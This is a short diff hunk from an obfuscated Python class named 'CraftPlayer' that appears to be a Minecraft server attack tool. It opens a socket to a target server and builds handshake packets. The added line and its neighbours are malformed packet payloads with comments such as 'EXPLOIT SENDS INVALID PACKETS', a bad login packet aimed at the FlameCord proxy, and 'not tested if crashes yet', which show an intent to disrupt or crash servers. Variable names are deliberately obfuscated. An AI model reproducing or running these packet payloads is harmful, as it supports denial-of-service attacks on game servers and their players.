@@ -341,6 +341,7 @@ class CraftPlayer :
             _O0O0O00OO0OOOO000 =O0OOOOO00OOO00000 ._server [1 ]
             O0OOOOO00OOO00000 ._socket .connect ((_O0O0OO0OOO0000O0O ,_O0O0O00OO0OOOO000 ))
             #O0OOOOO00OOO00000 .SendPacket ('n0 s3curity w4s f0und bitch') // EXPLOIT SENDS INVALID PACKETS
+	    #O0OOOOO00OOO00000 .SendPacket ('\xFE'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (1 )) #Bad Login Packet At LoginRequestEvent FlameCord
             #O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (1 )) #Sends PING instead of STATUS packet
             O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (2 ))
             #O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (0 )) # Spams errors due to sending invalid trash (NOT TESTED IF CRASHES YET)
